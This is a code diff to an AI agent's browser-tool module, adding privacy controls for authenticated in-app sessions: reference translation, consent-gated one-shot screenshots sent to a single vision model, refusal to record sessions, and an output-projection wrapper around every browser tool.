+                snapshot_text, element_count = _rewrite_in_app_snapshot(
+                    nav_session_key, snapshot_text, refs
+                )
                 if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
                     snapshot_text = _truncate_snapshot(snapshot_text)
                 response["snapshot"] = _redact_browser_output(snapshot_text)
-                response["element_count"] = len(refs) if refs else 0
+                response["element_count"] = element_count
                 if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
                     _copy_fallback_warning(response, snap_result)
         except Exception as e:
             logger.debug("Auto-snapshot after navigate failed: %s", e)
+            if isinstance(session_info.get("features"), dict) and session_info["features"].get("in_app") is True:
+                return json.dumps({
+                    "success": False,
+                    "error": str(e) if str(e).startswith("STALE_REF:") else "STALE_REF: snapshot reconciliation failed",
+                }, ensure_ascii=False)
 
         return json.dumps(response, ensure_ascii=False)
     else:
@@ -3055,12 +3592,23 @@ def browser_snapshot(
     if not full:
         args.extend(["-c"])  # Compact mode
 
+    _prepare_in_app_snapshot(effective_task_id)
     result = _run_browser_command(effective_task_id, "snapshot", args)
 
     if result.get("success"):
         data = result.get("data", {})
         snapshot_text = data.get("snapshot", "")
         refs = data.get("refs", {})
+
+        try:
+            snapshot_text, element_count = _rewrite_in_app_snapshot(
+                effective_task_id, snapshot_text, refs
+            )
+        except Exception as exc:
+            return json.dumps({
+                "success": False,
+                "error": str(exc) if str(exc).startswith("STALE_REF:") else "STALE_REF: snapshot reconciliation failed",
+            }, ensure_ascii=False)
 
         # ── Private-network guard: block snapshots from eval-navigated private pages ──
         # After any eval (browser_console) that may have changed location.href to a
@@ -3093,6 +3641,12 @@ def browser_snapshot(
             except Exception as _url_exc:
                 logger.debug("browser_snapshot: URL safety check failed (%s)", _url_exc)
 
+        # Authenticated snapshots cross ABP before auxiliary extraction. The
+        # final tool-result wrapper projects the auxiliary model's answer again.
+        snapshot_text = _project_in_app_snapshot_before_auxiliary(
+            effective_task_id, snapshot_text
+        )
+
         # Check if snapshot needs summarization
         if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
             snapshot_text = _extract_relevant_content(snapshot_text, user_task)
@@ -3102,7 +3656,7 @@ def browser_snapshot(
         response = {
             "success": True,
             "snapshot": _redact_browser_output(snapshot_text),
-            "element_count": len(refs) if refs else 0
+            "element_count": element_count
         }
         _copy_fallback_warning(response, result)
 
@@ -3152,12 +3706,21 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
     if not ref.startswith("@"):
         ref = f"@{ref}"
 
-    result = _run_browser_command(effective_task_id, "click", [ref])
+    external_ref = ref
+    try:
+        internal_ref = _translate_in_app_ref(effective_task_id, external_ref)
+    except Exception as exc:
+        return json.dumps({
+            "success": False,
+            "error": str(exc) if str(exc).startswith("STALE_REF:") else "STALE_REF: reference translation failed",
+        }, ensure_ascii=False)
+
+    result = _run_browser_command(effective_task_id, "click", [internal_ref])
 
     if result.get("success"):
         response = {
             "success": True,
-            "clicked": ref
+            "clicked": external_ref
         }
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
     else:
@@ -3193,8 +3756,17 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
     if not ref.startswith("@"):
         ref = f"@{ref}"
 
+    external_ref = ref
+    try:
+        internal_ref = _translate_in_app_ref(effective_task_id, external_ref)
+    except Exception as exc:
+        return json.dumps({
+            "success": False,
+            "error": str(exc) if str(exc).startswith("STALE_REF:") else "STALE_REF: reference translation failed",
+        }, ensure_ascii=False)
+
     # Use fill command (clears then types)
-    result = _run_browser_command(effective_task_id, "fill", [ref, text])
+    result = _run_browser_command(effective_task_id, "fill", [internal_ref, text])
 
     from agent.display import (
         redact_browser_typed_text_for_display,
@@ -3211,7 +3783,7 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
             # text passes through unchanged.  The raw value was already sent
             # to the browser command above.
             "typed": display_text,
-            "element": ref
+            "element": external_ref
         }
         response = _copy_fallback_warning(response, result)
         response = redact_browser_typed_text_for_display(response, text)
@@ -3290,6 +3862,7 @@ def browser_back(task_id: Optional[str] = None) -> str:
         return camofox_back(task_id)
 
     effective_task_id = _last_session_key(task_id or "default")
+    _invalidate_in_app_refs(effective_task_id)
     result = _run_browser_command(effective_task_id, "back", [])
 
     if result.get("success"):
@@ -3906,6 +4479,10 @@ def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 def _maybe_start_recording(task_id: str):
     """Start recording if browser.record_sessions is enabled in config."""
+    if _is_in_app_session(task_id):
+        # Authenticated recording has no trusted continuously-visible consent
+        # exchange yet. Deny before config reads, directory creation, or CDP.
+        return
     with _cleanup_lock:
         if task_id in _recording_sessions:
             return
@@ -4027,6 +4604,246 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
+_TRANSIENT_AUTHENTICATED_PIXEL_LIMIT = 8 * 1024 * 1024
+_PIXEL_CONSENT_METHOD = "Hermes.requestPixelConsent"
+_PIXEL_GRANT_PARAM = "__hermesPixelConsent"
+
+
+def _strict_vision_recipient() -> Dict[str, Any]:
+    """Resolve one exact auxiliary route without sending pixels or allowing fallback."""
+
+    from agent.auxiliary_client import (
+        _resolve_task_provider_model,
+        resolve_vision_provider_client,
+    )
+
+    provider, model, base_url, api_key, _api_mode = _resolve_task_provider_model(
+        "vision", None, None, None, None
+    )  # type: ignore[arg-type]
+    effective, client, final_model = resolve_vision_provider_client(
+        provider=provider if provider != "auto" else None,
+        model=model,
+        base_url=base_url,
+        api_key=api_key,
+        async_mode=False,
+    )
+    if client is None or not effective or not final_model:
+        raise RuntimeError("an exact auxiliary vision recipient is unavailable")
+    return {
+        "provider": effective,
+        "model": final_model,
+        "base_url": base_url,
+        "api_key": api_key,
+        "label": f"{effective}/{final_model}",
+    }
+
+
+def _in_app_cdp_call(
+    session_info: Dict[str, Any], method: str, params: Dict[str, Any], timeout: float
+) -> Dict[str, Any]:
+    """Use the automation-only relay; this seam is not model-visible."""
+
+    from tools.browser_cdp_tool import _cdp_call, _run_async
+
+    endpoint = session_info.get("cdp_url")
+    if not isinstance(endpoint, str) or not endpoint:
+        raise RuntimeError("authenticated automation relay is unavailable")
+    result = _run_async(_cdp_call(endpoint, method, params, None, timeout))
+    if not isinstance(result, dict):
+        raise RuntimeError("authenticated automation response is malformed")
+    return result
+
+
+def _authenticated_scope_payload(scope: Any) -> Dict[str, Any]:
+    return {
+        "profile": scope.profile,
+        "connection_id": scope.connection_id,
+        "capability_generation": scope.capability_generation,
+        "tab_id": scope.tab_id,
+        "binding_generation": scope.binding_generation,
+        "document_generation": scope.document_generation,
+        "task_id": scope.task_id,
+        "guest_generation": scope.guest_generation,
+        "task_generation": scope.task_generation,
+    }
+
+
+def _png_dimensions(data: bytearray) -> Tuple[int, int]:
+    if len(data) < 24 or bytes(data[:8]) != b"\x89PNG\r\n\x1a\n":
+        raise ValueError("transient capture is not a PNG")
+    width = int.from_bytes(data[16:20], "big")
+    height = int.from_bytes(data[20:24], "big")
+    if width <= 0 or height <= 0:
+        raise ValueError("transient capture dimensions are invalid")
+    return width, height
+
+
+def _authenticated_transient_vision(
+    question: str, annotate: bool, session_key: str
+) -> str:
+    """Consent, capture, analyze once, then release every app-owned pixel copy."""
+
+    import base64
+
+    if annotate:
+        return json.dumps(
+            {
+                "success": False,
+                "error": "CAPTURE_CONSENT_REQUIRED",
+                "message": "Trusted consent does not admit annotated or full-page authenticated pixels",
+            },
+            ensure_ascii=False,
+        )
+    purpose = question.strip() if isinstance(question, str) else ""
+    if not purpose or len(purpose) > 1024 or any(ord(char) < 32 for char in purpose):
+        return json.dumps(
+            {"success": False, "error": "CAPTURE_PURPOSE_INVALID"},
+            ensure_ascii=False,
+        )
+    scope = _require_authenticated_browser_scope(session_key)
+    session_info = _active_sessions.get(session_key)
+    if scope is None or not isinstance(session_info, dict):
+        return json.dumps(
+            {"success": False, "error": "AUTHENTICATED_SCOPE_INVALID"},
+            ensure_ascii=False,
+        )
+    try:
+        recipient = _strict_vision_recipient()
+    except Exception:
+        return json.dumps(
+            {
+                "success": False,
+                "error": "CAPTURE_RECIPIENT_UNAVAILABLE",
+                "message": "No exact no-fallback vision recipient is configured",
+            },
+            ensure_ascii=False,
+        )
+
+    exact_scope = _authenticated_scope_payload(scope)
+    capture_params = {
+        "captureBeyondViewport": False,
+        "format": "png",
+        "fromSurface": True,
+    }
+    try:
+        consent = _in_app_cdp_call(
+            session_info,
+            _PIXEL_CONSENT_METHOD,
+            {
+                "scope": exact_scope,
+                "captureParams": capture_params,
+                "purpose": purpose,
+                "recipient": recipient["label"],
+                "maxBytes": _TRANSIENT_AUTHENTICATED_PIXEL_LIMIT,
+                "retention": "memory-only-transient",
+            },
+            65.0,
+        )
+    except Exception:
+        return json.dumps(
+            {
+                "success": False,
+                "error": "CAPTURE_CONSENT_REQUIRED",
+                "message": "Trusted capture consent was unavailable before dispatch",
+            },
+            ensure_ascii=False,
+        )
+    grant_id = consent.get("grantId")
+    if consent.get("granted") is not True or not isinstance(grant_id, str):
+        return json.dumps(
+            {
+                "success": False,
+                "error": consent.get("error") or "CAPTURE_DENIED",
+                "message": "Authenticated screenshot was not captured",
+            },
+            ensure_ascii=False,
+        )
+
+    encoded = ""
+    data_url = ""
+    pixels = bytearray()
+    try:
+        captured = _in_app_cdp_call(
+            session_info,
+            "Page.captureScreenshot",
+            {
+                **capture_params,
+                _PIXEL_GRANT_PARAM: {
+                    "grantId": grant_id,
+                    "scope": exact_scope,
+                    "purpose": purpose,
+                    "recipient": recipient["label"],
+                },
+            },
+            30.0,
+        )
+        encoded = captured.get("data", "")
+        if not isinstance(encoded, str):
+            raise ValueError("transient screenshot response is malformed")
+        pixels = bytearray(base64.b64decode(encoded, validate=True))
+        if not pixels or len(pixels) > _TRANSIENT_AUTHENTICATED_PIXEL_LIMIT:
+            raise ValueError("transient screenshot exceeds its grant")
+        width, height = _png_dimensions(pixels)
+        data_url = "data:image/png;base64," + encoded
+        response = call_llm(
+            task="vision",
+            provider=recipient["provider"],
+            model=recipient["model"],
+            base_url=recipient["base_url"],
+            api_key=recipient["api_key"],
+            messages=[
+                {
+                    "role": "user",
+                    "content": [
+                        {"type": "text", "text": purpose},
+                        {"type": "image_url", "image_url": {"url": data_url}},
+                    ],
+                }
+            ],
+            max_tokens=2000,
+            temperature=0.1,
+            timeout=120.0,
+            allow_fallback=False,
+        )
+        route = getattr(response, "_hermes_resolved_route", None)
+        if route != {
+            "provider": recipient["provider"],
+            "model": recipient["model"],
+        }:
+            raise RuntimeError("vision recipient provenance changed")
+        analysis = (response.choices[0].message.content or "").strip()
+        return json.dumps(
+            {
+                "success": True,
+                "analysis": analysis or "Vision analysis returned no content.",
+                "capture": {
+                    "kind": "viewport-screenshot",
+                    "width": width,
+                    "height": height,
+                    "byte_count": len(pixels),
+                    "recipient": recipient["label"],
+                    "retention": "memory-only-transient",
+                },
+            },
+            ensure_ascii=False,
+        )
+    except Exception:
+        # A provider error, retry, or route change requires a fresh human grant.
+        # Do not log exception text: it may contain provider payload fragments.
+        return json.dumps(
+            {
+                "success": False,
+                "error": "TRANSIENT_VISION_FAILED",
+                "message": "Consented pixels were released after the one-shot operation failed",
+            },
+            ensure_ascii=False,
+        )
+    finally:
+        pixels[:] = b"\0" * len(pixels)
+        encoded = ""
+        data_url = ""
+
+
 def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
     """
     Take a screenshot of the current page for visual inspection.
@@ -4038,8 +4855,10 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     for visual content the text-based snapshot may not capture (CAPTCHAs,
     verification challenges, images, complex layouts, etc.).
 
-    The screenshot is saved persistently and its file path is returned so it
-    can be shared with users via MEDIA:<path> in the response.
+    Authenticated in-app sessions use a native trusted one-shot prompt and never
+    persist or attach the screenshot. Other browser backends preserve the legacy
+    behavior: the screenshot is saved and its file path is returned so it can be
+    shared with users via MEDIA:<path> in the response.
 
     Args:
         question: What you want to know about the page visually
@@ -4050,6 +4869,10 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         A JSON string with vision analysis results and screenshot_path, or a
         multimodal tool-result envelope carrying the screenshot and metadata.
     """
+    effective_task_id = _last_session_key(task_id or "default")
+    if _is_in_app_session(effective_task_id):
+        return _authenticated_transient_vision(question, annotate, effective_task_id)
+
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_vision
         return camofox_vision(question, annotate, task_id)
@@ -4059,7 +4882,15 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     from hermes_constants import get_hermes_dir
     screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
     screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
-    effective_task_id = _last_session_key(task_id or "default")
+
+    # Upstream draws recycled internal ref numbers into annotated pixels.  Until
+    # the P4 trusted overlay can draw from this adapter's external namespace,
+    # returning those labels would create a plausible but unsafe mismatch.
+    if annotate and _in_app_ref_scope(effective_task_id) is not None:
+        return json.dumps({
+            "success": False,
+            "error": "STALE_REF: annotated capture cannot atomically use stable external refs",
+        }, ensure_ascii=False)
 
     # ── Private-network guard: block vision from eval-navigated private pages ──
     # After any eval (browser_console) that may have changed location.href to a
@@ -4413,6 +5244,12 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
     for session_key in session_keys:
         _cleanup_single_browser_session(session_key)
 
+    from tools.in_app_browser_refs import retire_task
+    from tools.authenticated_browser_projection import retire_task as retire_abp_task
+
+    retire_task(bare_task_id)
+    retire_abp_task(bare_task_id)
+
     # Drop stale last-active ownership. Cleaning a bare task drops its binding;
     # cleaning a sidecar drops the binding only if that sidecar was still the
     # recorded owner. This prevents a later click/snapshot from resurrecting a
@@ -4674,10 +5511,7 @@ def _maybe_autoinstall_chromium() -> bool:
     except FileNotFoundError:
         return False
 
-    if browser_cmd == "npx agent-browser":
-        install_cmd = [shutil.which("npx") or "npx", "-y", "agent-browser", "install"]
-    else:
-        install_cmd = [browser_cmd, "install"]
+    install_cmd = _agent_browser_command_prefix(browser_cmd) + ["install"]
 
     logger.info(
         "browser: Chromium missing — auto-installing the browser binary "
@@ -4835,7 +5669,7 @@ if __name__ == "__main__":
                     print("       docker pull ghcr.io/nousresearch/hermes-agent:latest")
                 else:
                     print("     Install it with:")
-                    print("       npx agent-browser install --with-deps")
+                    print("       npx -y agent-browser@0.32.0 install --with-deps")
                     print("     Or:  npx playwright install --with-deps chromium")
         except FileNotFoundError:
             print("   - agent-browser CLI not found")
@@ -4861,11 +5695,67 @@ from tools.registry import registry, tool_error
 
 _BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}
 
+
+def _authenticated_tool_egress(tool_name: str, raw_result: Any, task_id: Optional[str]) -> Any:
+    """Mandatory final ABP boundary for every ordinary in-app tool return."""
+
+    session_key = _last_session_key(task_id or "default")
+    try:
+        scope = _require_authenticated_browser_scope(session_key)
+        if scope is None:
+            return raw_result
+        from tools.authenticated_browser_projection import (
+            PROJECTOR_VERSION,
+            serialize_projected_tool_result,
+        )
+
+        # browser_cdp applies its method-specific projector before returning.
+        # Do not recursively reinterpret already-projected URL displays as new
+        # capabilities; unprojected CDP errors still cross the generic boundary.
+        if tool_name == "browser_cdp" and isinstance(raw_result, str):
+            try:
+                decoded = json.loads(raw_result)
+            except (TypeError, ValueError):
+                decoded = None
+            if isinstance(decoded, dict) and decoded.get("projector_version") == PROJECTOR_VERSION:
+                return raw_result
+        return serialize_projected_tool_result(scope, tool_name, raw_result)
+    except Exception as exc:
+        code = getattr(exc, "code", "OUTPUT_PROJECTION_FAILED")
+        payload = {
+            "success": False,
+            "error": code,
+            "message": "Authenticated browser output was withheld",
+        }
+        return payload if isinstance(raw_result, dict) else json.dumps(payload, ensure_ascii=False)
+
+
+def _dispatch_authenticated_tool(tool_name: str, task_id: Optional[str], call) -> Any:
+    try:
+        raw_result = call()
+    except Exception:
+        session_key = _last_session_key(task_id or "default")
+        scope = _require_authenticated_browser_scope(session_key)
+        if scope is None:
+            raise
+        # Browser-originated exception bodies are never logged or serialized
+        # for authenticated partitions.
+        return json.dumps({
+            "success": False,
+            "error": "BROWSER_OPERATION_FAILED",
+            "message": "Authenticated browser operation failed before projection",
+        }, ensure_ascii=False)
+    return _authenticated_tool_egress(tool_name, raw_result, task_id)
+
+
 registry.register(
     name="browser_navigate",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
-    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_navigate", kw.get("task_id"),
+        lambda: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
+    ),
     check_fn=check_browser_requirements,
     emoji="🌐",
 )
@@ -4873,8 +5763,11 @@ registry.register(
     name="browser_snapshot",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
-    handler=lambda args, **kw: browser_snapshot(
-        full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_snapshot", kw.get("task_id"),
+        lambda: browser_snapshot(
+            full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
+    ),
     check_fn=check_browser_requirements,
     emoji="📸",
 )
@@ -4882,7 +5775,10 @@ registry.register(
     name="browser_click",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_click"],
-    handler=lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_click", kw.get("task_id"),
+        lambda: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
+    ),
     check_fn=check_browser_requirements,
     emoji="👆",
 )
@@ -4890,7 +5786,10 @@ registry.register(
     name="browser_type",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_type"],
-    handler=lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_type", kw.get("task_id"),
+        lambda: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
+    ),
     check_fn=check_browser_requirements,
     emoji="⌨️",
 )
@@ -4898,7 +5797,10 @@ registry.register(
     name="browser_scroll",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
-    handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_scroll", kw.get("task_id"),
+        lambda: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
+    ),
     check_fn=check_browser_requirements,
     emoji="📜",
 )
@@ -4906,7 +5808,10 @@ registry.register(
     name="browser_back",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_back"],
-    handler=lambda args, **kw: browser_back(task_id=kw.get("task_id")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_back", kw.get("task_id"),
+        lambda: browser_back(task_id=kw.get("task_id")),
+    ),
     check_fn=check_browser_requirements,
     emoji="◀️",
 )
@@ -4914,7 +5819,10 @@ registry.register(
     name="browser_press",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_press"],
-    handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_press", kw.get("task_id"),
+        lambda: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
+    ),
     check_fn=check_browser_requirements,
     emoji="⌨️",
 )
@@ -4923,7 +5831,10 @@ registry.register(
     name="browser_get_images",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
-    handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_get_images", kw.get("task_id"),
+        lambda: browser_get_images(task_id=kw.get("task_id")),
+    ),
     check_fn=check_browser_requirements,
     emoji="🖼️",
 )
@@ -4931,7 +5842,10 @@ registry.register(
     name="browser_vision",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_vision"],
-    handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_vision", kw.get("task_id"),
+        lambda: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
+    ),
     check_fn=check_browser_vision_requirements,
     emoji="👁️",
 )
@@ -4939,7 +5853,10 @@ registry.register(
     name="browser_console",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_console"],
-    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: _dispatch_authenticated_tool(
+        "browser_console", kw.get("task_id"),
+        lambda: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
+    ),
     check_fn=check_browser_requirements,
     emoji="🖥️",
 )
